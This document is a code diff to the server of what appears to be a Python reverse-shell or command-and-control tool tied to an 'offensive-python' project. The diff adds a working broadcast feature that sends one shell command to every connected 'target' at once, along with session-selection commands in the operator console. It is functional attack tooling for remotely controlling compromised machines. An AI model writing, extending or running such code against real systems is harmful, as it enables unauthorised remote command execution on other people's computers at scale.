@@ -11,18 +11,16 @@ import threading
 from prettytable import PrettyTable
 
 # TODO:
-#   1. Broadcast utility overhaul
-#   2. Log file utility overhaul
-#   3. Threads and locks implementation
-#   4. Add 'offensive-python' project utilities:
+#   1. Log file utility overhaul
+#   2. locks implementation
+#   3. Add 'offensive-python' project utilities:
 #       a. Display alert when client is visiting a blacklisted website
 #       b. Send heartbeat from client to server to verify it is alive
 #       c. Display alert when duplicate mac address is found in the client's ARP table
 #       d. Log all alerts as events (Should include: When, where & what happened)
-#   5. Encryption implementation
-#   6. Send platform data from client to sever upon request
-#   7. Go over function docstrings
-#   8. Read global variable values from json file upon flag usage
+#   4. Encryption implementation
+#   5. Send platform data from client to sever upon request
+#   6. Read global variable values from json file upon flag usage
 
 # SERVER_IP = socket.gethostbyname(socket.gethostname())  # Remote address
 SERVER_IP = "0.0.0.0"
@@ -221,7 +219,6 @@ def recv_msg(sock: socket.socket, command: str) -> None:
 def send_msg(sock: socket.socket, command: str) -> None:
     """
     Sends a command to the client and prints its output.
-    It can also broadcast the bash command to all targets if needed by triggering the 'broadcast' function.
 
     :param sock: Client socket object
     :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -229,11 +226,6 @@ def send_msg(sock: socket.socket, command: str) -> None:
     :type command: str
     :return: None
     """
-    # FIXME
-    #     enable_broadcast = input(color_msg("[?] Would you like to broadcast your command? y/n ")).lower()
-    #     if enable_broadcast == "y":
-    #         broadcast(f"{msg_len:<{HEADER_SIZE}}" + msg)
-    pass  # Place holder until broadcast utility is fixed
     # Send the message to the client, prefixed by a header of a set size
     # The header contains the message length padded by spaces (Used to ensure connection reliability)
     # Design flaw: Message size limit (E.g Message size limit of '9,999,999,999' if 'HEADER_SIZE' equals '10')
@@ -246,21 +238,23 @@ def send_msg(sock: socket.socket, command: str) -> None:
         recv_msg(sock, command)
 
 
-# FIXME
-#     def broadcast(msg):
-#         """This function broadcasts a message to all available clients.
-#         :param msg: Message in clear text
-#         :type msg: str
-#         :return: None
-#         """
-#         for client in CLIENTS:
-#             try:
-#                 client[0].send(msg.encode(FORMAT))
-#                 print(color_msg("[!] Communicating with ") + str(client[1]))
-#                 print(color_msg(recv_msg(client[0])))
-#             except:
-#                 print(color_msg("[!] Failed to send the message to - ") + str(client[1]))
-#         print(color_msg("[*] Message sent to all available clients"))
+def broadcast(command):
+    """
+    This function broadcasts a command to all connected clients.
+
+    :param command: Command to run on all clients
+    :type command: str
+    :return: None
+    """
+    for client in CLIENTS:
+        try:
+            print(termcolor.colored(f"[{client[1][0]}:{client[1][1]}]", "yellow"))
+            send_msg(client[0], command)
+        except Exception as err:
+            print(f"{clr(f'[!] ERROR SENDING MESSAGE: {err}')} ({str(client[1])})")
+            CLIENTS.remove(client)
+
+    print(clr("[+] Finished executing on all available targets"))
 
 
 def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
@@ -370,9 +364,12 @@ def handle_connections(s: socket.socket) -> None:
             command = input(clr("> "))
             if command == "clear":  # Clear server side console screen
                 os.system('cls' if os.name == 'nt' else 'clear')
-            elif command == "sessions":
+            elif command in ["exit", "quit"]:  # Close server side script
+                break
+            elif command == "sessions":  # List available sessions
                 display_sessions()
-            elif command[:12] == "sessions -i ":
+            elif command[:12] == "sessions -i ":  # Start a shell based on the specified session id
+                # Verify specified session id exists
                 i = command[12:]
                 if i.isdigit():
                     if 0 <= int(i) < len(CLIENTS):
@@ -382,8 +379,9 @@ def handle_connections(s: socket.socket) -> None:
                         print(f"{clr('[!] ERROR: The specified index is out of range')}")
                 else:
                     print(f"{clr('[!] ERROR: The specified index is not an integer')}")
-            elif command in ["exit", "quit"]:
-                break
+            elif command[:10] == "broadcast ":  # Broadcast a command to all clients
+                broadcast(command[10:])
+                continue  # Skip to next iteration
     except KeyboardInterrupt:
         pass
     finally:
